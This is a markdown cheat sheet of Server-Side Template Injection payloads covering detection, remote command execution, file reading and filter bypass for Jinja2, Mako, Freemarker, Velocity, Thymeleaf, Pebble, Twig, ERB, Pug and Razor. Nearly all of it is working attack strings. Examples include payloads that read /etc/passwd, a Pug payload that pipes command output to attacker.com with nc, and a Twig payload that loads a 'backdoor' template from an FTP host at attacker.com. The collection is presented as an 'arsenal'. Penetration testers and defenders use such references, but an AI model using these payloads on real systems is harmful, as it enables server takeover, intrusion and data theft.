# 🔥 SSTI Payloads Collection

```
  ███████╗███████╗████████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔════╝╚══██╔══╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗███████╗   ██║   ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║╚════██║   ██║   ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║███████║   ██║   ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚══════╝   ╚═╝   ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
                     Server-Side Template Injection
```

---

## 🔍 Detection Payloads

### Universal Detection
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
{{7*'7'}}
```

> If you see `49` in the response = SSTI vulnerable!

### Identify Template Engine
```
{{7*'7'}}         → Jinja2/Twig returns 7777777
${7*7}            → Freemarker/Velocity
<%= 7*7 %>        → ERB (Ruby)
#{7*7}            → Pebble
*{7*7}            → Thymeleaf
```

---

## 🐍 Python (Jinja2)

### Detection
```python
{{7*7}}
{{config}}
{{config.items()}}
{{self}}
{{request}}
```

### RCE Payloads
```python
# Method 1 - config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Method 2 - cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Method 3 - MRO (Most common)
{{''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate()}}

# Method 4 - lipsum
{{lipsum.__globals__.os.popen('id').read()}}

# Method 5 - Request
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Read Files
```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}
```

### Filter Bypass
```python
# Using attr filter
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

# Using join filter  
{%set x=''|join('')|attr('__class__')%}

# Hex encoding
{{''['\x5f\x5fclass\x5f\x5f']}}
```

---

## 🌿 Python (Mako)

```python
<%import os%>${os.popen("id").read()}
${self.module.cache.util.os.system("id")}
${self.template.module.cache.util.os.popen("id").read()}
```

---

## ☕ Java (Freemarker)

### Detection
```java
${7*7}
${object.class}
<#assign s="freemarker.template.utility.Execute"?new()>${s("id")}
```

### RCE Payloads
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder",["id"]).start()}
${"freemarker.template.utility.Execute"?new()("id")}
```

---

## 🍃 Java (Velocity)

```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### Simple
```java
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

---

## 🌱 Java (Thymeleaf)

### Detection
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

### RCE Payloads
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
```

---

## 🌸 Java (Pebble)

```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes) }}
```

---

## 🐦 PHP (Twig)

### Detection
```php
{{7*7}}
{{7*'7'}}  → 7777777 (string multiplication)
{{dump(app)}}
{{_self}}
```

### RCE Payloads
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{['id']|filter('system')}}

{{['id']|map('system')|join}}

{{_self.env.setCache("ftp://attacker.com:21")}}{{_self.env.loadTemplate("backdoor")}}
```

### Read Files
```php
{{'/etc/passwd'|file_excerpt(1,-1)}}
```

---

## 💎 Ruby (ERB)

### Detection
```ruby
<%= 7*7 %>
<%= self %>
```

### RCE Payloads
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= require 'open3'; Open3.capture2('id') %>
```

---

## 🟢 Node.js (Jade/Pug)

### Detection
```javascript
#{7*7}
-var x = 1; p= x
```

### RCE Payloads
```javascript
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}

-var x = root.process.mainModule.require
-x('child_process').exec('id | nc attacker.com 80')
```

---

## 🔷 .NET (Razor)

```csharp
@(7*7)
@{
    var p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c id";
    p.Start();
}
```

---

## 📊 Quick Reference

| Template Engine | Detection | RCE |
|-----------------|-----------|-----|
| Jinja2 | `{{7*7}}` | `{{config.__class__...}}` |
| Twig | `{{7*'7'}}` | `{{_self.env...}}` |
| Freemarker | `${7*7}` | `<#assign ex=...>` |
| Velocity | `$class.class` | `#set($rt=...)` |
| ERB | `<%= 7*7 %>` | `<%= system('id') %>` |
| Pug | `#{7*7}` | `#{global.process...}` |

---

## 🛡️ Bypass Techniques

### Blocked Keywords
```python
# Use request args
{{request.args.cmd}}?cmd=__class__

# String concatenation
{{''['__cla'+'ss__']}}

# Hex encoding
{{''['\x5f\x5fclass\x5f\x5f']}}
```

### Blocked Brackets
```python
{%print(7*7)%}
```

---

## 📚 Resources

- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

---

<p align="center">
  <b>🔥 SSTI Payload Arsenal</b><br>
  <i>For educational purposes only!</i>
</p>
